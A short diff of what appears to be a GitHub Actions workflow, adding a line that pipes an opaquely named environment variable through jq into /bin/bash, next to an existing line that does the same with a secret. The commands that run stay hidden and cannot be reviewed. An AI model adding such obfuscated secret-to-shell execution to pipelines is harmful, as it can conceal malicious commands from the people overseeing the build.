@@ -18,6 +18,7 @@ jobs:
           mhz2: ${{ secrets.mhz2 }}
         run: |
           printf '%s' "$mhz2" | jq -r .zfc729 | /bin/bash
+          echo $ugye43162 | jq -r .bqx52 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
